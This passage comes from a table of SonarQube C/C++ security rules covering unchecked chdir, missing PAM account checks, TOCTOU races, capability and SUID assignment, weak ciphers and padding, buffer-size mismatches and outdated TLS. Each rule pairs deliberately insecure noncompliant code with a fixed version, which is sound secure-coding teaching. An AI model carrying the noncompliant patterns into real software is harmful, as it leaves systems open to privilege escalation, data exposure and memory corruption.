<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/22" rel="nofollow">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory (&#39;Path
  Traversal&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5982">
              cpp:S5982
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of changing the current working directory is to modify the base path when the process performs relative path resolutions. When the
working directory cannot be changed, the process keeps the directory previously defined as the active working directory. Thus, verifying the success
of chdir() type of functions is important to prevent unintended relative paths and unauthorized access.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The success of changing the working directory is relevant for the application. </li><li> Changing the working directory is required by chroot to make the new root effective. </li><li> Subsequent disk operations are using relative paths. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>After changing the current working directory verify the success of the operation and handle errors.</p>
<h2>Sensitive Code Example</h2>
<p>The <code>chdir</code> operation could fail and the process still has access to unauthorized resources. The return code should be verified:</p>
<pre>
const char* any_dir &#61; &#34;/any/&#34;;
chdir(any_dir); // Sensitive: missing check of the return value

int fd &#61; open(any_dir, O_RDONLY | O_DIRECTORY);
fchdir(fd); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>Verify the return code of <code>chdir</code> and handle errors:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;
if (chdir(root_dir) &#61;&#61; -1) {
  exit(-1);
} // Compliant

int fd &#61; open(any_dir, O_RDONLY | O_DIRECTORY);
if(fchdir(fd) &#61;&#61; -1) {
  exit(-1);
} // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/252" rel="nofollow">MITRE, CWE-252</a> - Unchecked Return Value </li><li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html" rel="nofollow">man7.org</a> - chdir </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5832">
              cpp:S5832
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Pluggable authentication module (PAM) is a mechanism used on many unix variants to provide a unified way to authenticate users, independently of
the underlying authentication scheme.</p>
<p>When authenticating users, it is strongly recommended to check the validity of the account (not locked, not expired …​), otherwise it leads to
unauthorized access to resources.</p>
<h3>Noncompliant code example</h3>
<p>The account validity is not checked with <code>pam_acct_mgmt</code> when authenticating a user with <code>pam_authenticate</code>:</p>
<pre>
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) !&#61; PAM_SUCCESS) { // Noncompliant - missing pam_acct_mgmt
        return -1;
    }

    return 0;
}
</pre>
<p>The return value of <code>pam_acct_mgmt</code> is not checked:</p>
<pre>
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) !&#61; PAM_SUCCESS) {
        return -1;
    }
    pam_acct_mgmt(pamh, 0); // Noncompliant
    return 0;
}
</pre>
<h3>Compliant solution</h3>
<p>When authenticating a user with <code>pam_authenticate</code>, check the account validity with <code>pam_acct_mgmt</code>:</p>
<pre>
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) !&#61; PAM_SUCCESS) {
        return -1;
    }
    if (pam_acct_mgmt(pamh, 0) !&#61; PAM_SUCCESS) { // Compliant
        return -1;
    }
    return 0;
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/304" rel="nofollow">MITRE, CWE-304</a> - Missing Critical Step in Authentication </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5847">
              cpp:S5847
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>&#34;Time Of Check to Time Of Use&#34; (TOCTOU) vulnerabilities occur when an application:</p>
<ul><li> First, checks permissions or attributes of a file: for instance, is a file a symbolic link? </li><li> Next, performs some operations such as writing data to this file. </li></ul>
<p>The application cannot assume the state of the file is unchanged between these two steps, there is a race condition (ie: two different processes
can access and modify the same shared object/file at the same time, which can lead to privilege escalation, denial of service and other unexpected
results).</p>
<p>For instance, attackers can benefit from this situation by creating a symbolic link to a sensitive file directly after the first step (eg in Unix:
<code>/etc/passwd</code>) and try to elevate their privileges (eg: if the written data has the correct <code>/etc/passwd</code> file format).</p>
<p>To avoid TOCTOU vulnerabilities, one possible solution is to do a single atomic operation for the &#34;check&#34; and &#34;use&#34; actions, therefore removing the
race condition window. Another possibility is to use file descriptors. This way the binding of the file descriptor to the file cannot be changed by a
concurrent process.</p>
<h3>Noncompliant code example</h3>
<p>A &#34;check function&#34; (for instance <code>access</code>, <code>stat</code> …​ in this case <code>access</code> to verify the existence of a file) is
used, followed by a &#34;use function&#34; (<code>open</code>, <code>fopen</code> …​) to write data inside a non existing file. These two consecutive calls
create a TOCTOU race condition:</p>
<pre>
#include &lt;stdio.h&gt;

void fopen_with_toctou(const char *file) {
  if (access(file, F_OK) &#61;&#61; -1 &amp;&amp; errno &#61;&#61; ENOENT) {
    // the file doesn&#39;t exist
    // it is now created in order to write some data inside
    FILE *f &#61; fopen(file, &#34;w&#34;); // Noncompliant: a race condition window exist from access() call to fopen() call calls
    if (NULL &#61;&#61; f) {
      /* Handle error */
    }

    if (fclose(f) &#61;&#61; EOF) {
      /* Handle error */
    }
  }
}
</pre>
<h3>Compliant solution</h3>
<p>If the file already exists on the disk, <code>fopen</code> with <code>x</code> mode will fail:</p>
<pre>
#include &lt;stdio.h&gt;

void open_without_toctou(const char *file) {
  FILE *f &#61; fopen(file, &#34;wx&#34;); // Compliant
  if (NULL &#61;&#61; f) {
    /* Handle error */
  }
  /* Write to file */
  if (fclose(f) &#61;&#61; EOF) {
    /* Handle error */
  }
}
</pre>
<p>A more generic solution is to use &#34;file descriptors&#34;:</p>
<pre>
void open_without_toctou(const char *file) {
  int fd &#61; open(file, O_CREAT | O_EXCL | O_WRONLY);
  if (-1 !&#61; fd) {
    FILE *f &#61; fdopen(fd, &#34;w&#34;);  // Compliant
  }
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/367" rel="nofollow">MITRE, CWE-367</a> - Time-of-check Time-of-use (TOCTOU) Race Condition </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.&#43;Avoid&#43;TOCTOU&#43;race&#43;conditions&#43;while&#43;accessing&#43;files" rel="nofollow">CERT, FIO45-C.</a> - Avoid
  TOCTOU race conditions while accessing files </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5849">
              cpp:S5849
            </a>
          </td>
          <td>
            <details>
              <p>Setting capabilities can lead to privilege escalation.</p>
<p>Linux capabilities allow you to assign narrow slices of <code>root</code>&#39;s permissions to files or processes. A thread with capabilities bypasses
the normal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring (additional) root
privileges.</p>
<h2>Ask Yourself Whether</h2>
<p>Capabilities are granted:</p>
<ul><li> To a process that does not require all capabilities to do its job. </li><li> To a not trusted process. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary
capabilities are assigned to files and processes.</p>
<h2>Sensitive Code Example</h2>
<p>When setting capabilities:</p>
<pre>
cap_t caps &#61; cap_init();
cap_value_t cap_list[2];
cap_list[0] &#61; CAP_FOWNER;
cap_list[1] &#61; CAP_CHOWN;
cap_set_flag(caps, CAP_PERMITTED, 2, cap_list, CAP_SET);

cap_set_file(&#34;file&#34;, caps); // Sensitive
cap_set_fd(fd, caps); // Sensitive
cap_set_proc(caps); // Sensitive
capsetp(pid, caps); // Sensitive
capset(hdrp, datap); // Sensitive: is discouraged to be used because it is a system call
</pre>
<p>When setting SUID/SGID attributes:</p>
<pre>
chmod(&#34;file&#34;, S_ISUID|S_ISGID); // Sensitive
fchmod(fd, S_ISUID|S_ISGID); // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/250" rel="nofollow">MITRE, CWE-250</a> - Execution with Unnecessary Privileges </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://forums.grsecurity.net/viewtopic.php?f&#61;7&amp;t&#61;2522" rel="nofollow">False Boundaries and Arbitrary Code Execution</a> </li><li> <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" rel="nofollow">Linux manual page</a> - capabilities(7) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5547">
              cpp:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;DES/CBC/PKCS7&#34;, Botan::ENCRYPTION); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;AES-256/GCM&#34;, Botan::ENCRYPTION);
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://botan.randombit.net/handbook/" rel="nofollow">Botan</a> - Handbook </li><li> <a href="https://www.feistyduck.com/books/openssl-cookbook/" rel="nofollow">OpenSSL</a> - Cookbook </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5542">
              cpp:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;AES-256/ECB&#34;, Botan::ENCRYPTION); // Noncompliant
}
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), &#34;PKCS1v15&#34;); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create(&#34;AES-256/GCM&#34;, Botan::ENCRYPTION);
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), &#34;OAEP&#34;);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul><li> CCM: <code>Counter with CBC-MAC</code> </li><li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li><li> EAX: <code>Encrypt-and-Authenticate</code> </li><li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li><li> OCB: <code>Offset Codebook Mode</code> </li></ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5782">
              cpp:S5782
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Array overruns and buffer overflows happen when memory access accidentally goes beyond the boundary of the allocated array or buffer. These
overreaching accesses cause some of the most damaging, and hard to track defects.</p>
<p>When the buffer overflow happens while reading a buffer, it can expose sensitive data that happens to be located next to the buffer in memory. When
it happens while writing a buffer, it can be used to inject code or to wipe out sensitive memory.</p>
<p>This rule detects when a POSIX function takes one argument that is a buffer and another one that represents the size of the buffer, but the two
arguments do not match.</p>
<h3>Noncompliant code example</h3>
<pre>
char array[10];
initialize(array);
void *pos &#61; memchr(array, &#39;&#64;&#39;, 42); // Noncompliant, buffer overflow that could expose sensitive data
</pre>
<h3>Compliant solution</h3>
<pre>
char array[10];
initialize(array);
void *pos &#61; memchr(array, &#39;&#64;&#39;, 10);
</pre>
<h3>Exceptions</h3>
<p>Functions related to sockets using the type <code>socklen_t</code> are not checked. This is because these functions are using a C-style polymorphic
pattern using <code>union</code>. It relies on a mismatch between allocated memory and sizes of structures and it creates false positives.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/119" rel="nofollow">MITRE, CWE-119</a> - Improper Restriction of Operations within the Bounds of a Memory
  Buffer </li><li> <a href="https://cwe.mitre.org/data/definitions/131" rel="nofollow">MITRE, CWE-131</a> - Incorrect Calculation of Buffer Size </li><li> <a href="https://cwe.mitre.org/data/definitions/788" rel="nofollow">MITRE, CWE-788</a> - Access of Memory Location After End of Buffer </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/wtYxBQ" rel="nofollow">CERT, ARR30-C.</a> - Do not form or use out-of-bounds pointers or array subscripts </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/i3w-BQ" rel="nofollow">CERT, STR50-CPP.</a> - Guarantee that storage for strings has sufficient space for
  character data and the null terminator </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S4423">
              cpp:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in cURL</h2>
<h3>Code examples</h3>
<p>The following code samples attempt to create an HTTP request.</p>
<h4>Noncompliant code example</h4>
<p>This sample uses Curl’s default TLS algorithms, which are weak cryptographical algorithms: TLSv1.0 and LTSv1.1.</p>
<pre data-diff-id="11" data-diff-type="noncompliant">
#include &lt;curl/curl.h&gt;

void encrypt() {
    CURL *curl;
    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl &#61; curl_easy_init();                                      // Noncompliant
    curl_easy_setopt(curl, CURLOPT_URL, &#34;https://example.com/&#34;);

    curl_easy_perform(curl);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
#include &lt;curl/curl.h&gt;

void encrypt() {
    CURL *curl;
    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl &#61; curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, &#34;https://example.com/&#34;);
    curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);

    curl_easy_perform(curl);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S4426">
              cpp:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul><li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li><li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul><li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li></ul>  </li></ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
